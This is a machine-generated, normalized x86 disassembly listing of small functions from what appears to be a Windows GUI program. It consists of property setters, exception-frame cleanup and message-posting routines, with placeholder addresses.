mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
pop ebx
retn
sub_45af30
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
pop ebx
retn
sub_45af44
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
pop ebx
retn
sub_45af58
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
pop ebx
retn
sub_45af6c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
pop ebx
retn
sub_45af80
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
pop ebx
retn
sub_45af94
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
pop ebx
retn
sub_45afa8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
pop ebx
retn
sub_45afbc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
pop ebx
retn
sub_45afd0
retn
sub_45afd4
retn
sub_45afd8
retn
sub_45afdc
retn
sub_45afe0
retn
sub_45afe4
retn
sub_45afe8
retn
sub_45afec
retn
sub_45aff0
retn
sub_45aff4
retn
sub_45aff8
retn
sub_45affc
retn
sub_45b2a8
jmp sub_403a98
sub_45b644
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x90 ] eax
sub_45b6c4
push esi
mov si 0xffef
call sub_403518
pop esi
retn
sub_45b765
jmp sub_403a98
sub_45b76c
pop ebp
retn
sub_45b770
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418378
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418378
sub_45b910
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_45bae9
jmp sub_403a98
sub_45baf0
pop ebx
pop ecx
pop ebp
retn
sub_45baf4
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_45bafc
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_45bccc
sub_45bba9
jmp sub_403a98
sub_45bbb0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_40331c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_45bd5f
jmp sub_403a98
sub_45bd66
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45bdfe
jmp sub_403a98
sub_45be05
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45be22
mov eax [ ebp - 0xc ]
call sub_40331c
retn
sub_45be1b
jmp sub_403a98
sub_45be22
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403518
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45bedb
jmp sub_403a98
sub_45bee2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45bee8
or edx 0xffffffff
call sub_45be5c
retn
sub_45c2f7
jmp sub_403a98
sub_45c2fe
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c31b
mov eax [ ebp - 0xc ]
call sub_40331c
retn
sub_45c314
jmp sub_403a98
sub_45c31b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c338
mov eax [ ebp - 0x4 ]
call sub_45ce30
retn
sub_45c331
jmp sub_403a98
sub_45c338
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45c53c
jmp sub_403a98
sub_45c543
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45c548
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403518
sub_45c560
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_417644
pop ebx
retn
sub_45c604
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_418b9c
sub_45c71b
jmp sub_403a98
sub_45c722
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40331c
retn
sub_45c738
jmp sub_403a98
sub_45ca4a
jmp sub_403a98
sub_45ca51
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ca6e
mov eax [ ebp - 0x10 ]
call sub_40331c
retn
sub_45ca67
jmp sub_403a98
sub_45ca6e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ca8b
mov eax [ ebp - 0x8 ]
call sub_40331c
retn
sub_45ca84
jmp sub_403a98
sub_45ca8b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45caf4
jmp sub_403a98
sub_45cc0d
jmp sub_403a98
sub_45cc2a
jmp sub_403a98
sub_45cde2
jmp sub_403a98
sub_45cde9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ce2c
inc [ eax + 0x5c ]
retn
sub_45ce30
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403518
sub_45ce84
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_45cec1
jmp sub_403a98
sub_45cec8
pop ebp
retn
sub_45cecc
sub [ rw-data ] 0x1
retn
sub_45ddd7
jmp [ eax + eax ]
sub_45de34
mov eax [ esp + 0x8 ]
retn
sub_45de3c
push ebx
mov ebx eax
call sub_45de34
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
jmp sub_403ad0
sub_45de58
pop ebx
retn
sub_45e0d1
jmp sub_403a98
sub_45e0d8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e223
jmp sub_403a98
sub_45e22a
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45e240
push ebx
mov eax [ rw-data ]
call sub_419250
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_419224
mov eax ebx
pop ebx
retn
sub_45e3c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034cc
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_45e3e4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_45eadf
jmp sub_403a98
sub_45eae6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ebde
jmp sub_403a98
sub_45ebe5
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45f008
jmp sub_403a98
sub_45f00f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_45f4bb
jmp sub_403a98
sub_45f95c
jmp sub_403a98
sub_45f963
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45fdc7
jmp sub_403a98
sub_460284
jmp sub_403a98
sub_46028b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_460636
jmp sub_403a98
sub_46063d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46064b
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4607f8
mov eax [ r-xdata ]
retn
sub_460834
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_460848
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_460858
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_460868
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_460b64
mov edx eax
sub_460900
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4034cc
mov edx esi
call sub_460880
pop esi
pop ebx
retn
sub_46097c
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_460b64
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_418d54
mov ecx eax
sub_460d54
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_460dbc
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_461164
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_461198
sub_461198
mov edx sub_461170
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_45e2c0
retn
sub_461382
jmp sub_403a98
sub_461389
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461820
jmp sub_403a98
sub_46185f
jmp sub_403a98
sub_461866
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461a04
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_461b40
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403518
pop esi
pop ebp
retn 0x8
sub_461b5c
mov eax [ eax + 0x34 ]
call sub_45ed94
retn
sub_461b68
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403518
pop esi
retn
sub_461ba4
push ebx
mov ecx sub_461b7c
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_45e2c0
pop ebx
retn
sub_461dd8
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_461dec
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_461f21
jmp sub_4037e4
sub_462023
jmp sub_403a98
sub_46204e
jmp sub_403a98
sub_462055
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_46206c
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_462254
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_461ba4
sub_4622d4
jmp sub_403a98
sub_462318
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_462330
push ebx
mov ebx eax
mov eax ebx
call sub_421ecc
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_462382
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_461ba4
sub_4623f8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_462541
jmp sub_403a98
sub_462548
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_462788
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_462798
sub_4627ec
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_4627fc
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_46280c
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_46281c
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_46282c
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_4628a4
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_45ebec
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_45ebec
retn
sub_4628c0
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_45ebec
sub_462908
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_461b5c
retn
mov eax edx
retn
sub_462942
jmp sub_4037e4
sub_462947
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46e56c
call sub_403b4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462cad
jmp sub_403a98
sub_462cb4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_40331c
retn
sub_462cca
jmp sub_403a98
sub_462dcb
jmp sub_403a98
sub_462dd2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462def
mov eax [ ebp - 0x14 ]
call sub_40331c
retn
sub_462de8
jmp sub_403a98
sub_462e0d
jmp sub_403a98
sub_462e97
jmp sub_403a98
sub_462e9e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462ed0
push ebx
mov ebx eax
mov eax ebx
call sub_418e94
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_422c7c
sub_462f94
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_462fa8
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_462fb0
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_463375
jmp sub_403a98
sub_46337c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46347c
jmp sub_403a98
sub_463483
pop ebp
retn
sub_465304
mov eax [ rw-data ]
retn
sub_46530c
mov [ rw-data ] eax
retn
sub_465454
jmp sub_4037e4
sub_46548b
jmp sub_403a98
sub_465492
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465660
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_422b0c
pop ebp
retn 0x8
sub_465674
call sub_422ba4
retn
sub_4657b6
jmp sub_403a98
sub_4657bd
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_465861
jmp sub_403a98
sub_465868
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4658f8
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_466024
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4666d0
sub_466040
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_466024
sub_466160
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4666d0
sub_466178
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4666d0
sub_466190
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_4666d0
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_4661bc
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_4661c8
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_4666d0
retn
sub_4664a8
push ebx
mov ebx edx
mov edx ebx
call sub_451f40
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_466518
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_466640
jmp sub_403a98
sub_466647
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466650
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_465a5c
mov eax [ ebx + 0x20c ]
call sub_465a5c
sub_4666b0
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4666c0
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4667bb
jmp sub_403a98
sub_4667c8
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_4667e0
sub_4669fc
retn
sub_466a6a
jmp sub_403a98
sub_466aa9
jmp sub_403a98
sub_466adc
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_453438
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_465ce8
retn
sub_466b00
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_453458
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_465ce8
retn
sub_466bf5
jmp sub_403a98
sub_466bfc
mov eax [ ebp - 0x4 ]
call sub_4553b8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_465950
mov eax [ ebp - 0x4 ]
call sub_4666d0
sub_466d30
jmp sub_403a98
sub_466d68
jmp sub_403a98
sub_466d6f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466d8f
lea eax [ ebp - 0x114 ]
call sub_404118
retn
sub_466d88
jmp sub_403a98
sub_466d8f
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_467096
jmp sub_403a98
sub_46709d
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4036b8
sub_4670f1
jmp sub_4037e4
sub_46716d
jmp sub_4037e4
sub_467172
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46e56c
call sub_403b4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46752a
jmp sub_403a98
sub_467531
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46760c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d7c8
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_467624
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46765c
mov edx eax
mov eax esi
call sub_41f9e0
pop esi
pop ebx
retn
sub_467640
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_468a00
mov edx eax
mov eax esi
call sub_41f9e0
pop esi
pop ebx
retn
sub_46765c
push ebx
mov ebx eax
mov eax ebx
call sub_4686a0
mov edx r-xdata
call sub_425948
pop ebx
retn
sub_467760
push ebx
mov ebx eax
mov eax ebx
call sub_467770
xor al 0x1
pop ebx
retn
sub_467770
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_4677cc
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_4677ec
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_46780c
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_467b05
jmp sub_403a98
sub_467b0c
pop ecx
pop ebp
retn
sub_467b10
xor eax eax
retn
sub_467de8
jmp sub_403a98
sub_467def
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40331c
retn
sub_467e05
jmp sub_403a98
sub_467eef
jmp sub_403a98
sub_467ef6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467f13
mov eax [ ebp - 0xc ]
call sub_40331c
retn
sub_467f0c
jmp sub_403a98
sub_467f33
jmp sub_403a98
sub_46821e
jmp sub_403a98
sub_4683b1
jmp sub_403a98
sub_4686a0
mov eax [ eax + 0x238 ]
retn
sub_4686a8
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4686b4
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_4689f2
jmp sub_403a98
sub_4689f9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468a00
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_468a48
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_452654
sub_468a64
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_468aa0
push ebx
mov ebx eax
mov eax ebx
call sub_4545e8
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_4252cc
sub_468b24
push ebx
mov ebx eax
mov eax ebx
call sub_454610
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_4259ec
sub_468b44
push ebx
mov ebx eax
mov eax ebx
call sub_468764
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_46882c
pop ebx
retn
sub_469371
lea eax [ ebp - 0xb4 ]
call sub_404118
retn
sub_46937d
jmp sub_403a98
j_sub_469371
jmp sub_469371
sub_469384
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4694dc
jmp sub_403a98
sub_4694e3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4697c8
jmp sub_403a98
sub_4697cf
mov eax [ rw-data ]
call sub_46c080
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4697e6
add [ eax ] al
retn
sub_469a44
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_469a64
mov eax [ eax + 0x240 ]
call sub_429b90
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_46de20
sub_469b0b
jmp sub_403a98
sub_469b12
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469b35
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4259c4
retn
sub_469b2e
jmp sub_403a98
sub_469b35
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469cf4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_469a64
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_469f5c
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_461d10
sub_46a047
jmp sub_403a98
sub_46a04e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a054
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_46983c
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_46a0ac
call sub_46add4
retn
sub_46a4f9
jmp sub_403a98
sub_46a500
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a7fc
jmp sub_4037e4
sub_46ab98
jmp sub_4037e4
sub_46ac91
jmp sub_403a98
sub_46ac98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46acb5
lea eax [ ebp - 0x8 ]
call sub_404118
retn
sub_46acae
jmp sub_403a98
sub_46acb5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46acbc
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_429b90
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_467704
sub_46acdc
call sub_40331c
retn
sub_46ad34
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_46ad9a
jmp sub_403a98
sub_46af48
jmp sub_4037e4
sub_46af74
xor edx edx
call sub_467a68
retn
sub_46af7c
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_467a68
mov eax ebx
call sub_44eb14
pop ebx
retn
sub_46b002
jmp sub_403a98
sub_46b009
pop ebx
pop ecx
pop ebp
retn
sub_46b010
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_4550b4
push eax
call PostMessageA
pop ebx
retn
sub_46b214
jmp sub_403a98
sub_46b2b5
jmp sub_403a98
sub_46b2bf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b2de
mov eax [ rw-data ]
call sub_46d4f8
retn
sub_46b2d7
jmp sub_403a98
sub_46b2de
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b2fb
lea eax [ ebp - 0x20 ]
call sub_404118
retn
sub_46b2f4
jmp sub_403a98
sub_46b2fb
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b3dc
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_44dcc0
retn
mov edx eax
mov eax [ rw-data ]
call sub_46cb4c
retn
sub_46b760
mov edx eax
mov eax [ rw-data ]
call sub_46e56c
mov al 0x1
retn
sub_46b848
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_46b770
sub_46b85c
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_46b770
sub_46b870
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_46b770
sub_46b884
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_46b770
sub_46b898
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_46ba03
jmp sub_403a98
sub_46ba0a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ba10
push ebx
mov ebx eax
mov eax ebx
call sub_4539cc
mov eax ebx
call sub_453b50
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_46b010
sub_46bc86
jmp sub_403a98
sub_46bc8d
pop esi
